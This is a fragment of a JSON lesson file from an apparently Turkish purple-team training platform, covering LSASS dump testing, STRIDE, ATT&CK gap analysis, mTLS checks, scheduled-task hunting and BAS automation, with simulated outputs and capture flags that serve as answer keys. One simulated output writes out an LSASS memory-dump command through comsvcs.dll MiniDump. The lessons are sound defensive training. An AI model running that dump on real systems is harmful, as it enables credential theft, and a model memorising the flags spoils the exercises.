        "level": "3. Sürekli İyileştirme ve Tehdit Bilgisi",
        "badge": "BAS CREDENTIAL DUMP VALIDATION",
        "theory": "### Parola Çekmecesinin Güvenlik Testi: T1003 Doğrulama\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nBanka müdürünün, güvenlik görevlisini test etmek için kasanın kapısını gizlice zorlaması gibidir. Görevli anında silahını çekip 'Dur!' derse tatbikat başarılıdır; uyumaya devam ederse sistemde büyük bir açık vardır.\n\n#### T1003.001 Testi:\nLSASS prosesine `OpenProcess` çağrısıyla okuma isteği atılır. Eğer EDR bunu bloklarsa test 'Engellendi (Blocked)' olarak işaretlenir; eğer bellek dökülürse Purple Team savunma kuralını derhal günceller.",
        "mission": "LSASS bellek erişimini atomik testle simüle edip EDR tepkisini doğrulamak için Invoke-AtomicTest T1003.001 -TestNumbers 2 komutunu çalıştırın.",
        "expectedCommand": "Invoke-AtomicTest T1003.001 -TestNumbers 2",
        "acceptedCommands": [
            "Invoke-AtomicTest T1003.001 -TestNumbers 2",
            "Invoke-AtomicTest T1003.001",
            "Invoke-AtomicTest 'T1003.001' -TestNumbers 2"
        ],
        "hintExplanation": "<p><strong>T1003.001:</strong> MITRE ATT&CK OS Credential Dumping: LSASS Memory tekniğidir.</p><p><strong>-TestNumbers 2:</strong> Comsvcs.dll MiniDump simülasyonunu çalıştırır.</p>",
        "terminalSuccessOutput": "Executing test: T1003.001-2 Dump LSASS.exe Memory using comsvcs.dll\nExecuting: rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump 648 C:\\temp\\lsass.dmp full\n[EDR ENGELİ] Operation Blocked by Endpoint Protection (0xC0000022 - Access Denied)\n[KURAL DURUMU] LSASS koruma kuralı %100 başarıyla doğrulandı!\n[FLAG] LFL{purple_atomic_lsass_dumping_defense_validated}",
        "flag": "LFL{purple_atomic_lsass_dumping_defense_validated}",
        "nextId": "purple-305",
        "whyWeUse": "**Ezberlemeden Önce Mantığını Anla:** Gerçek bir siber güvenlik operasyonunda (3. Sürekli İyileştirme ve Tehdit Bilgisi) binlerce satırlık veriyi veya karmaşık sistem ayarlarını gözle kontrol etmek imkansızdır. Bu odada `Invoke-AtomicTest T1003.001 -TestNumbers 2` komutunu kullanmamızın sebebi; **Saldırı Simülasyonu: T1003 LSASS Credential Dump Doğrulama** senaryosunda aradığımız kritik kanıtı, açık kapıyı veya güvenlik zafiyetini doğrudan işletim sistemi çekirdeğinden/loglarından hatasız şekilde çekmektir. T1003.001: MITRE ATT&CK OS Credential Dumping: LSASS Memory tekniğidir. -TestNumbers 2: Comsvcs.dll MiniDump simülasyonunu çalıştırır.",
        "cmdAnatomy": [
            {
                "token": "Invoke-AtomicTest",
                "role": "Ana Siber Araç / Komut",
                "desc": "Bu görevde çalıştırdığımız ana güvenlik veya sistem aracı (Invoke-AtomicTest)."
            },
            {
                "token": "T1003.001",
                "role": "Parametre Değeri / Hedef",
                "desc": "Komuta verilen arama kelimesi, kural veya hedef argüman (T1003.001)."
            },
            {
                "token": "-TestNumbers",
                "role": "Komut Parametresi (Flag)",
                "desc": "Komutun çalışma davranışını özelleştiren ve detaylı analiz modunu açan parametre (-TestNumbers)."
            },
            {
                "token": "2",
                "role": "Parametre Değeri / Hedef",
                "desc": "Komuta verilen arama kelimesi, kural veya hedef argüman (2)."
            }
        ],
        "outputGuide": [
            {
                "snippet": "Executing test: T1003.001-2 Dump LSASS.exe Memory using comsvcs.dll",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "Executing: rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump 648 C:...",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "[EDR ENGELİ] Operation Blocked by Endpoint Protection (0xC0000022 - Acce...",
                "meaning": "Güvenlik politikasının devreye girerek yetkisiz erişimi veya saldırı paketini **engellediğini** gösterir."
            },
            {
                "snippet": "[KURAL DURUMU] LSASS koruma kuralı %100 başarıyla doğrulandı!",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            }
        ],
        "beginnerTerms": [
            {
                "term": "OpenProcess",
                "desc": "Bu odadaki (Saldırı Simülasyonu: T1003 LSASS Credential Dump Doğrulama) senaryoda kullanılan ve sistemin ilgili bileşenini/parametresini ifade eden teknik kavramdır."
            }
        ],
        "quickCheck": {
            "question": "Bu odada çalıştırdığımız `Invoke-AtomicTest T1003.001 -TestNumbers 2` komutunun temel amacı nedir?",
            "options": [
                "LSASS bellek erişimini atomik testle simüle edip EDR tepkisini doğrulamak için Invoke-AtomicTest T1003.001 -TestNumbers 2",
                "Bilgisayarın ekran kartı sürücüsünü güncellemek",
                "Sistemi tamamen silip yeniden başlatmak"
            ],
            "answer": 0,
            "explanation": "Doğru! `Invoke-AtomicTest T1003.001 -TestNumbers 2` komutu ezbere yazılan bir kod değil; T1003.001: MITRE ATT&CK OS Credential Dumping: LSASS Memory tekniğidir. -TestNumbers 2: Comsvcs.dll MiniDump simülasyonunu çalıştırır."
        }
    },
    {
        "id": "purple-305",
        "track": "purple",
        "title": "Tehdit Modellemesi: STRIDE Metodolojisi ile Tasarım Zırhlama",
        "level": "3. Sürekli İyileştirme ve Tehdit Bilgisi",
        "badge": "STRIDE THREAT MODELING",
        "theory": "### Kod Yazılmadan Önce Zafiyeti Öngörmek: STRIDE Analizi\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nBir gökdelenin temelini atmadan önce mimari çizimini masaya yatırıp 'Bu bina 8 şiddetinde depreme dayanır mı? Yangın merdiveni nereye açılıyor?' diye hesap yapmaktır. İnşaat bittikten sonra hatayı düzeltmek 100 kat daha pahalıdır.\n\n#### STRIDE Kategorileri:\n* **S (Spoofing):** Sahte kimlikle sisteme girilebilir mi?\n* **T (Tampering):** Veri tabandaki veri değiştirilebilir mi?\n* **R (Repudiation):** 'Ben yapmadım' diye inkar edilebilir mi (Log var mı)?\n* **I (Info Disclosure):** Gizli veri dışarı sızabilir mi?\n* **D (Denial of Service):** Sunucu çökertilebilir mi?\n* **E (Elevation of Privilege):** Yetki yükseltilebilir mi?",
        "mission": "Sistem mimarisinin STRIDE tehdit değerlendirme raporunu üretmek için stride-cli evaluate --diagram architecture_v2.json komutunu çalıştırın.",
        "expectedCommand": "stride-cli evaluate --diagram architecture_v2.json",
        "acceptedCommands": [
            "stride-cli evaluate --diagram architecture_v2.json",
            "stride-cli evaluate architecture_v2.json",
            "stride evaluate --diagram architecture_v2.json"
        ],
        "hintExplanation": "<p><strong>stride-cli:</strong> Yazılım ve bulut mimari diyagramlarındaki potansiyel güvenlik açıklarını modelleyen analiz aracıdır.</p>",
        "terminalSuccessOutput": "[STRIDE ENGINE] Analyzing Data Flows, Trust Boundaries and Stores...\n[S] Spoofing: PASS (OAuth2 & JWT HMAC-SHA256)\n[T] Tampering: PASS (EF Core Parameterized Queries)\n[R] Repudiation: WARN (API DELETE endpoints missing central audit log)\n[I] Info Disclosure: PASS (Strict TLS 1.3 & Server Redaction)\n[D] DoS: PASS (Rate Limiting 100 req/min)\n[E] Elevation: PASS (RBAC Policy Enforcement)\n[RAPOR ONAYLANDI] Mimari tehdit modeli başarıyla çıkarıldı!\n[FLAG] LFL{purple_stride_threat_modeling_matrix_approved}",
        "flag": "LFL{purple_stride_threat_modeling_matrix_approved}",
        "nextId": "purple-306",
        "whyWeUse": "**Ezberlemeden Önce Mantığını Anla:** Gerçek bir siber güvenlik operasyonunda (3. Sürekli İyileştirme ve Tehdit Bilgisi) binlerce satırlık veriyi veya karmaşık sistem ayarlarını gözle kontrol etmek imkansızdır. Bu odada `stride-cli evaluate --diagram architecture_v2.json` komutunu kullanmamızın sebebi; **Tehdit Modellemesi: STRIDE Metodolojisi ile Tasarım Zırhlama** senaryosunda aradığımız kritik kanıtı, açık kapıyı veya güvenlik zafiyetini doğrudan işletim sistemi çekirdeğinden/loglarından hatasız şekilde çekmektir. stride-cli: Yazılım ve bulut mimari diyagramlarındaki potansiyel güvenlik açıklarını modelleyen analiz aracıdır.",
        "cmdAnatomy": [
            {
                "token": "stride-cli",
                "role": "Ana Siber Araç / Komut",
                "desc": "Bu görevde çalıştırdığımız ana güvenlik veya sistem aracı (stride-cli)."
            },
            {
                "token": "evaluate",
                "role": "Parametre Değeri / Hedef",
                "desc": "Komuta verilen arama kelimesi, kural veya hedef argüman (evaluate)."
            },
            {
                "token": "--diagram",
                "role": "Komut Parametresi (Flag)",
                "desc": "Komutun çalışma davranışını özelleştiren ve detaylı analiz modunu açan parametre (--diagram)."
            },
            {
                "token": "architecture_v2.json",
                "role": "Parametre Değeri / Hedef",
                "desc": "Komuta verilen arama kelimesi, kural veya hedef argüman (architecture_v2.json)."
            }
        ],
        "outputGuide": [
            {
                "snippet": "[STRIDE ENGINE] Analyzing Data Flows, Trust Boundaries and Stores...",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "[S] Spoofing: PASS (OAuth2 & JWT HMAC-SHA256)",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "[T] Tampering: PASS (EF Core Parameterized Queries)",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "[R] Repudiation: WARN (API DELETE endpoints missing central audit log)",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            }
        ],
        "beginnerTerms": [
            {
                "term": "stride-cli",
                "desc": "Tehdit Modellemesi: STRIDE Metodolojisi ile Tasarım Zırhlama görevinde kullanılan temel siber güvenlik ve sistem analiz aracıdır."
            }
        ],
        "quickCheck": {
            "question": "Bu odada çalıştırdığımız `stride-cli evaluate --diagram architecture_v2.json` komutunun temel amacı nedir?",
            "options": [
                "Sistem mimarisinin STRIDE tehdit değerlendirme raporunu üretmek için stride-cli evaluate --diagram architecture_v2.json",
                "Bilgisayarın ekran kartı sürücüsünü güncellemek",
                "Sistemi tamamen silip yeniden başlatmak"
            ],
            "answer": 0,
            "explanation": "Doğru! `stride-cli evaluate --diagram architecture_v2.json` komutu ezbere yazılan bir kod değil; stride-cli: Yazılım ve bulut mimari diyagramlarındaki potansiyel güvenlik açıklarını modelleyen analiz aracıdır."
        }
    },
    {
        "id": "purple-306",
        "track": "purple",
        "title": "Boşluk Analizi: MITRE ATT&CK Navigator Isı Haritası",
        "level": "3. Sürekli İyileştirme ve Tehdit Bilgisi",
        "badge": "MITRE ATTACK HEATMAP & GAP ANALYSIS",
        "theory": "### Savunmanın Röntgeni: ATT&CK Navigator Isı Haritası\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nBir futbol antrenörünün elindeki taktik tahtasıdır. Sahayı bölgelere ayırır: 'Kalecimiz ve stoperlerimiz çok iyi (Yeşil renk), ancak sağ kanattan gelen kontrataklarda hiç kimse koşmuyor (Kırmızı renk)'. Kırmızı olan zafiyetli bölgelere acil takviye yapılır.\n\n#### Gap (Boşluk) Analizi:\nKurumun sahip olduğu kurallar MITRE matrisi üzerine bindirilir. Örneğin T1059 ve T1003 algılanıyorsa yeşil, ancak T1055 (Process Injection) tespit edilemiyorsa kırmızı yanar. Purple Team bu boşlukları tek tek kapatır.",
        "mission": "Kurumsal tespit kapsama haritasını derleyip ısı haritasını üretmek için attack-navigator --layer mitre_coverage_layer.json --render-heatmap komutunu çalıştırın.",
        "expectedCommand": "attack-navigator --layer mitre_coverage_layer.json --render-heatmap",
        "acceptedCommands": [
            "attack-navigator --layer mitre_coverage_layer.json --render-heatmap",
            "attack-navigator --layer mitre_coverage_layer.json",
            "attack-navigator --render-heatmap mitre_coverage_layer.json"
        ],
        "hintExplanation": "<p><strong>attack-navigator:</strong> MITRE ATT&CK tekniklerinin kapsama oranlarını görselleştiren resmi analiz aracıdır.</p>",
        "terminalSuccessOutput": "[+] Loading MITRE ATT&CK Enterprise Matrix v14.1\n[+] Mapping 184 enterprise techniques...\n[+] Techniques Covered (Green): 152 (82.6%)\n[+] Detection Gaps (Red): 32 (17.4%)\n[CRITICAL GAP FOUND] T1071.004 (DNS Tunneling) has NO active detection rule!\n[ISI HARİTASI OLUŞTURULDU] Boşluk analizi raporu /opt/purple/heatmap.svg olarak kaydedildi.\n[FLAG] LFL{purple_mitre_navigator_gap_coverage_heatmap_generated}",
        "flag": "LFL{purple_mitre_navigator_gap_coverage_heatmap_generated}",
        "nextId": "purple-307",
        "whyWeUse": "**Ezberlemeden Önce Mantığını Anla:** Gerçek bir siber güvenlik operasyonunda (3. Sürekli İyileştirme ve Tehdit Bilgisi) binlerce satırlık veriyi veya karmaşık sistem ayarlarını gözle kontrol etmek imkansızdır. Bu odada `attack-navigator --layer mitre_coverage_layer.json --render-heatmap` komutunu kullanmamızın sebebi; **Boşluk Analizi: MITRE ATT&CK Navigator Isı Haritası** senaryosunda aradığımız kritik kanıtı, açık kapıyı veya güvenlik zafiyetini doğrudan işletim sistemi çekirdeğinden/loglarından hatasız şekilde çekmektir. attack-navigator: MITRE ATT&CK tekniklerinin kapsama oranlarını görselleştiren resmi analiz aracıdır.",
        "cmdAnatomy": [
            {
                "token": "attack-navigator",
                "role": "Ana Siber Araç / Komut",
                "desc": "Bu görevde çalıştırdığımız ana güvenlik veya sistem aracı (attack-navigator)."
            },
            {
                "token": "--layer",
                "role": "Komut Parametresi (Flag)",
                "desc": "Komutun çalışma davranışını özelleştiren ve detaylı analiz modunu açan parametre (--layer)."
            },
            {
                "token": "mitre_coverage_layer.json",
                "role": "Parametre Değeri / Hedef",
                "desc": "Komuta verilen arama kelimesi, kural veya hedef argüman (mitre_coverage_layer.json)."
            },
            {
                "token": "--render-heatmap",
                "role": "Komut Parametresi (Flag)",
                "desc": "Komutun çalışma davranışını özelleştiren ve detaylı analiz modunu açan parametre (--render-heatmap)."
            }
        ],
        "outputGuide": [
            {
                "snippet": "[+] Loading MITRE ATT&CK Enterprise Matrix v14.1",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "[+] Mapping 184 enterprise techniques...",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "[+] Techniques Covered (Green): 152 (82.6%)",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "[+] Detection Gaps (Red): 32 (17.4%)",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            }
        ],
        "beginnerTerms": [
            {
                "term": "attack-navigator",
                "desc": "Boşluk Analizi: MITRE ATT&CK Navigator Isı Haritası görevinde kullanılan temel siber güvenlik ve sistem analiz aracıdır."
            }
        ],
        "quickCheck": {
            "question": "Bu odada çalıştırdığımız `attack-navigator --layer mitre_coverage_layer.json --render-heatmap` komutunun temel amacı nedir?",
            "options": [
                "Kurumsal tespit kapsama haritasını derleyip ısı haritasını üretmek için attack-navigator --layer mitre_coverage_layer.json --render-heatmap",
                "Bilgisayarın ekran kartı sürücüsünü güncellemek",
                "Sistemi tamamen silip yeniden başlatmak"
            ],
            "answer": 0,
            "explanation": "Doğru! `attack-navigator --layer mitre_coverage_layer.json --render-heatmap` komutu ezbere yazılan bir kod değil; attack-navigator: MITRE ATT&CK tekniklerinin kapsama oranlarını görselleştiren resmi analiz aracıdır."
        }
    },
    {
        "id": "purple-307",
        "track": "purple",
        "title": "Zero-Trust Doğrulama: Mikrosegmentasyon & mTLS Testi",
        "level": "3. Sürekli İyileştirme ve Tehdit Bilgisi",
        "badge": "ZERO-TRUST & MTLS VALIDATION",
        "theory": "### İç Ağda Bile Güven Yok: Çift Taraflı Doğrulama (mTLS)\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nKlasik web sitelerinde müşteri bankaya bakar ('Banka güvenli mi?'). mTLS'te ise banka da müşteriye 'Bana kendi parmak izli dijital sertifikanı sun' der. İki taraf da birbirini kriptografik olarak kanıtlamadan aralarında tek bir bayt bile akamaz.\n\n#### Mikrosegmentasyon Doğrulaması:\nRed Team web sunucusunu ele geçirse bile, veritabanına mTLS istemci sertifikası olmadan bağlanamaz. Purple Team istemci sertifikasının doğruluğunu ve yetkisiz erişimlerin reddedildiğini (HTTP 403 Forbidden) test eder.",
        "mission": "İstemci sertifikasını kullanarak korumalı kasa servisine mTLS doğrulamalı istek atmak için curl --cert client.crt --key client.key https://vault.internal/api/keys komutunu çalıştırın.",
        "expectedCommand": "curl --cert client.crt --key client.key https://vault.internal/api/keys",
        "acceptedCommands": [
            "curl --cert client.crt --key client.key https://vault.internal/api/keys",
            "curl --cert client.crt --key client.key https://vault.internal/api/keys -k",
            "curl https://vault.internal/api/keys --cert client.crt --key client.key"
        ],
        "hintExplanation": "<p><strong>--cert / --key:</strong> İstemcinin kendini sunucuya kanıtlamak için sunduğu kriptografik sertifika ve özel anahtardır.</p>",
        "terminalSuccessOutput": "HTTP/2 200 OK\nTLS-Session: TLS_AES_256_GCM_SHA384 (TLSv1.3)\nClient-Certificate-Validated: CN=authorized-analyst-node-01\nmTLS Handshake Status: VERIFIED\n{\n  \"status\": \"authorized\",\n  \"vault_access\": \"granted\",\n  \"zero_trust_policy\": \"enforced\"\n}\n[DOĞRULAMA TAMAM] mTLS mikrosegmentasyon kalkanı başarıyla doğrulandı!\n[FLAG] LFL{purple_zero_trust_mtls_microsegmentation_tested}",
        "flag": "LFL{purple_zero_trust_mtls_microsegmentation_tested}",
        "nextId": "purple-308",
        "whyWeUse": "**Ezberlemeden Önce Mantığını Anla:** Gerçek bir siber güvenlik operasyonunda (3. Sürekli İyileştirme ve Tehdit Bilgisi) binlerce satırlık veriyi veya karmaşık sistem ayarlarını gözle kontrol etmek imkansızdır. Bu odada `curl --cert client.crt --key client.key https://vault.internal/api/keys` komutunu kullanmamızın sebebi; **Zero-Trust Doğrulama: Mikrosegmentasyon & mTLS Testi** senaryosunda aradığımız kritik kanıtı, açık kapıyı veya güvenlik zafiyetini doğrudan işletim sistemi çekirdeğinden/loglarından hatasız şekilde çekmektir. --cert / --key: İstemcinin kendini sunucuya kanıtlamak için sunduğu kriptografik sertifika ve özel anahtardır.",
        "cmdAnatomy": [
            {
                "token": "curl",
                "role": "Ana Komut (Web İstemcisi)",
                "desc": "'Client URL' kısaltmasıdır. Tarayıcı açmadan terminal üzerinden bir web sitesine bağlanıp veri veya başlık (header) çekmeye yarar."
            },
            {
                "token": "--cert",
                "role": "Komut Parametresi (Flag)",
                "desc": "Komutun çalışma davranışını özelleştiren ve detaylı analiz modunu açan parametre (--cert)."
            },
            {
                "token": "client.crt",
                "role": "Parametre Değeri / Hedef",
                "desc": "Komuta verilen arama kelimesi, kural veya hedef argüman (client.crt)."
            },
            {
                "token": "--key",
                "role": "Komut Parametresi (Flag)",
                "desc": "Komutun çalışma davranışını özelleştiren ve detaylı analiz modunu açan parametre (--key)."
            },
            {
                "token": "client.key",
                "role": "Parametre Değeri / Hedef",
                "desc": "Komuta verilen arama kelimesi, kural veya hedef argüman (client.key)."
            },
            {
                "token": "https://vault.internal/api/keys",
                "role": "Hedef Web Adresi (URL)",
                "desc": "Komutun bağlanacağı veya test edeceği hedef web adresi (https://vault.internal/api/keys)."
            }
        ],
        "outputGuide": [
            {
                "snippet": "HTTP/2 200 OK",
                "meaning": "İşlemin veya bağlantının **başarıyla** gerçekleştiğini doğrulayan sonuç satırıdır."
            },
            {
                "snippet": "TLS-Session: TLS_AES_256_GCM_SHA384 (TLSv1.3)",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "Client-Certificate-Validated: CN=authorized-analyst-node-01",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "mTLS Handshake Status: VERIFIED",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            }
        ],
        "beginnerTerms": [
            {
                "term": "curl",
                "desc": "Zero-Trust Doğrulama: Mikrosegmentasyon & mTLS Testi görevinde kullanılan temel siber güvenlik ve sistem analiz aracıdır."
            }
        ],
        "quickCheck": {
            "question": "Bu odada çalıştırdığımız `curl --cert client.crt --key client.key https://vault.internal/api/keys` komutunun temel amacı nedir?",
            "options": [
                "İstemci sertifikasını kullanarak korumalı kasa servisine mTLS doğrulamalı istek atmak için curl --cert client.crt --key client.key https://vault.internal/api/keys",
                "Bilgisayarın ekran kartı sürücüsünü güncellemek",
                "Sistemi tamamen silip yeniden başlatmak"
            ],
            "answer": 0,
            "explanation": "Doğru! `curl --cert client.crt --key client.key https://vault.internal/api/keys` komutu ezbere yazılan bir kod değil; --cert / --key: İstemcinin kendini sunucuya kanıtlamak için sunduğu kriptografik sertifika ve özel anahtardır."
        }
    },
    {
        "id": "purple-308",
        "track": "purple",
        "title": "Ortak Tehdit Avı: Zamanlanmış Görev Kalıcılık Avı",
        "level": "3. Sürekli İyileştirme ve Tehdit Bilgisi",
        "badge": "JOINT HUNTING & SCHEDULED TASKS",
        "theory": "### Kırmızı Bırakır, Mavi Avlar: Koordineli Tatbikat\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nEğitmen subayın kışlanın gizli bir yerine sahte bomba saklayıp, ardından arama kurtarma köpeğini ve askerleri kışlaya salarak bombayı ne kadar sürede bulacaklarını kronometreyle izlemesi gibidir.\n\n#### Kalıcılık Mekanizması (Persistence):\nRed Team sistemde her gece 03:00'da çalışacak gizli bir zamanlanmış görev (`Scheduled Task`) bırakır. Blue Team PowerShell cmdlet'leriyle görev tablosunu tarayarak şüpheli komutları ve bilinmeyen ikili dosyaları filtreleyip imha eder.",
        "mission": "PowerShell ile şüpheli TelemetryUpdate zamanlanmış görevini tespit etmek için Get-ScheduledTask | Where-Object {$_.TaskName -like '*TelemetryUpdate*'} komutunu çalıştırın.",
        "expectedCommand": "Get-ScheduledTask | Where-Object {$_.TaskName -like '*TelemetryUpdate*'}",
        "acceptedCommands": [
            "Get-ScheduledTask | Where-Object {$_.TaskName -like '*TelemetryUpdate*'}",
            "Get-ScheduledTask | Where-Object {$_.TaskName -like \"*TelemetryUpdate*\"}",
            "Get-ScheduledTask -TaskName '*TelemetryUpdate*'"
        ],
        "hintExplanation": "<p><strong>Get-ScheduledTask:</strong> Windows'taki tüm kayıtlı zamanlanmış görevleri çeker.</p><p><strong>Where-Object:</strong> Görev adında şüpheli kelime filtresi uygular.</p>",
        "terminalSuccessOutput": "TaskPath TaskName                 State\n-------- --------                 -----\n\\        TelemetryUpdateSystem    Ready\n  Actions: Executing C:\\ProgramData\\updater.exe -silent -beacon\n  Trigger: At 03:00 every day\n[TATBİKAT KANITI] Red Team tarafından bırakılan gizli arka kapı görevi 42 saniyede yakalandı!\n[MÜDAHALE] Görev silindi ve ikili dosya karantinaya alındı.\n[FLAG] LFL{purple_joint_exercise_scheduled_task_caught}",
        "flag": "LFL{purple_joint_exercise_scheduled_task_caught}",
        "nextId": "purple-309",
        "whyWeUse": "**Ezberlemeden Önce Mantığını Anla:** Gerçek bir siber güvenlik operasyonunda (3. Sürekli İyileştirme ve Tehdit Bilgisi) binlerce satırlık veriyi veya karmaşık sistem ayarlarını gözle kontrol etmek imkansızdır. Bu odada `Get-ScheduledTask | Where-Object {$_.TaskName -like '*TelemetryUpdate*'}` komutunu kullanmamızın sebebi; **Ortak Tehdit Avı: Zamanlanmış Görev Kalıcılık Avı** senaryosunda aradığımız kritik kanıtı, açık kapıyı veya güvenlik zafiyetini doğrudan işletim sistemi çekirdeğinden/loglarından hatasız şekilde çekmektir. Get-ScheduledTask: Windows'taki tüm kayıtlı zamanlanmış görevleri çeker. Where-Object: Görev adında şüpheli kelime filtresi uygular.",
        "cmdAnatomy": [
            {
                "token": "Get-ScheduledTask",
                "role": "Ana Siber Araç / Komut",
                "desc": "Bu görevde çalıştırdığımız ana güvenlik veya sistem aracı (Get-ScheduledTask)."
            },
            {
                "token": "|",
                "role": "Boru İşareti (Pipe / Aktarım)",
                "desc": "Sol taraftaki komutun ürettiği ekran çıktısını alır, sağ taraftaki komuta girdi olarak aktarır (iki komutu birbirine bağlar)."
            },
            {
                "token": "Where-Object",
                "role": "Parametre Değeri / Hedef",
                "desc": "Komuta verilen arama kelimesi, kural veya hedef argüman (Where-Object)."
            },
            {
                "token": "{$_.TaskName",
                "role": "Parametre Değeri / Hedef",
                "desc": "Komuta verilen arama kelimesi, kural veya hedef argüman ({$_.TaskName)."
            },
            {
                "token": "-like",
                "role": "Komut Parametresi (Flag)",
                "desc": "Komutun çalışma davranışını özelleştiren ve detaylı analiz modunu açan parametre (-like)."
            },
            {
                "token": "'*TelemetryUpdate*'}",
                "role": "Parametre Değeri / Hedef",
                "desc": "Komuta verilen arama kelimesi, kural veya hedef argüman ('*TelemetryUpdate*'})."
            }
        ],
        "outputGuide": [
            {
                "snippet": "TaskPath TaskName                 State",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "-------- --------                 -----",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "\\        TelemetryUpdateSystem    Ready",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "Actions: Executing C:\\ProgramData\\updater.exe -silent -beacon",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            }
        ],
        "beginnerTerms": [
            {
                "term": "Scheduled Task",
                "desc": "Bu odadaki (Ortak Tehdit Avı: Zamanlanmış Görev Kalıcılık Avı) senaryoda kullanılan ve sistemin ilgili bileşenini/parametresini ifade eden teknik kavramdır."
            }
        ],
        "quickCheck": {
            "question": "Bu odada çalıştırdığımız `Get-ScheduledTask | Where-Object {$_.TaskName -like '*TelemetryUpdate*'}` komutunun temel amacı nedir?",
            "options": [
                "PowerShell ile şüpheli TelemetryUpdate zamanlanmış görevini tespit etmek için Get-ScheduledTask | Where-Object {$_.TaskName -like '*TelemetryUpdate*'}",
                "Bilgisayarın ekran kartı sürücüsünü güncellemek",
                "Sistemi tamamen silip yeniden başlatmak"
            ],
            "answer": 0,
            "explanation": "Doğru! `Get-ScheduledTask | Where-Object {$_.TaskName -like '*TelemetryUpdate*'}` komutu ezbere yazılan bir kod değil; Get-ScheduledTask: Windows'taki tüm kayıtlı zamanlanmış görevleri çeker. Where-Object: Görev adında şüpheli kelime filtresi uygular."
        }
    },
    {
        "id": "purple-309",
        "track": "purple",
        "title": "BAS Otomasyonu: Sürekli Güvenlik Doğrulama Pipeline'ı",
        "level": "3. Sürekli İyileştirme ve Tehdit Bilgisi",
        "badge": "AUTOMATED BAS & CI/CD PIPELINE",
        "theory": "### 7/24 Kesintisiz Güvenlik Testi: BAS Otomasyonu\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nOtomobil fabrikalarında üretilen her arabanın montaj bandından iner inmez otomatik robot kollarla fren testine, yağmur testine ve çarpışma simülasyonuna sokulması gibidir. İnsan yorulur ama otomatik test motoru asla uyumaz.\n\n#### Sürekli Güvenlik Doğrulama (Continuous Validation):\nBAS motoru her gece sanal test ortamında fidye yazılımı (Ransomware) ve Active Directory saldırı senaryolarını otomatik çalıştırır. Savunmada herhangi bir aksama olduğunda yazılımcılara ve SOC analistlerine sabah saat 08:00'da acil uyarı raporu gider.",
        "mission": "Active Directory Ransomware simülasyon senaryosunu otomatize BAS motoruyla çalıştırmak için bas-engine run --scenario 'ActiveDirectory-Ransomware-Simulation' komutunu çalıştırın.",
        "expectedCommand": "bas-engine run --scenario 'ActiveDirectory-Ransomware-Simulation'",
        "acceptedCommands": [
            "bas-engine run --scenario 'ActiveDirectory-Ransomware-Simulation'",
            "bas-engine run --scenario \"ActiveDirectory-Ransomware-Simulation\"",
            "bas-engine run ActiveDirectory-Ransomware-Simulation"
        ],
        "hintExplanation": "<p><strong>bas-engine:</strong> Kurumsal güvenlik doğrulamalarını senaryo bazlı otomatize eden test aracıdır.</p>",
        "terminalSuccessOutput": "[BAS ENGINE v3.8] Initializing Continuous Validation Pipeline...\n[*] Phase 1: Ingress Phishing Simulation -> BLOCKED by DMARC & WebFilter (100%)\n[*] Phase 2: Lateral Movement (Pass-the-Hash) -> BLOCKED by Protected Users (100%)\n[*] Phase 3: Mass File Encryption Attempt -> DETECTED by EDR Canary Trap in 140ms\n[PIPELINE STATUS] PASS: 18/18 Defense Tests Succeeded! Resilience Score: 98.4/100\n[FLAG] LFL{purple_continuous_bas_automated_validation_passed}",
        "flag": "LFL{purple_continuous_bas_automated_validation_passed}",
        "nextId": "purple-310",
